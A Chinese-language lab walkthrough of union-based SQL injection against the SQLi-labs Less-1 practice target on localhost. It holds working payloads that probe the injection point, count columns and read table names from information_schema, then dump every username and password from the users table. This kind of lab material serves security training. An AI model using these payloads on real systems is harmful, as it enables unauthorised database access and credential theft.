# 🛠️ 漏洞复现步骤

### 步骤1：判断注入点

访问 URL：`http://localhost/sqli-labs/Less-1/?id=1'`  

页面返回 SQL 语法报错（`You have an error in your SQL syntax`），说明存在字符型注入（单引号未被过滤）。

### 步骤2：判断查询列数

- 测试列数 3：`http://localhost/sqli-labs/Less-1/?id=1' order by 3--+`（页面正常）

- 测试列数 4：`http://localhost/sqli-labs/Less-1/?id=1' order by 4--+`（页面报错）结论：查询结果有 **3 列**。

### 步骤3：爆数据库基础信息

构造 payload：  

`http://localhost/sqli-labs/Less-1/?id=-1' union select 1,version(),database()--+`  

返回结果：

- 数据库版本：`5.7.x`（根据你的环境显示）

- 当前数据库名：`security`

### 步骤4：爆数据库表名

构造 payload：  

`http://localhost/sqli-labs/Less-1/?id=-1' union select 1,user(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+`  

返回表名：`emails,referers,uagents,users`（核心表为 `users`）。

### 步骤5：爆 users 表字段

构造 payload：  

`http://localhost/sqli-labs/Less-1/?id=-1' union select 1,user(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')--+`  

返回字段：`id,username,password`。

### 步骤6：脱库（获取所有用户凭据）

构造 payload：  

`http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(username,':',password) from users--+`  

返回结果：`Dumb:Dumb,Angelina:I-kill-you,admin:12345,...`（所有用户名和密码）。

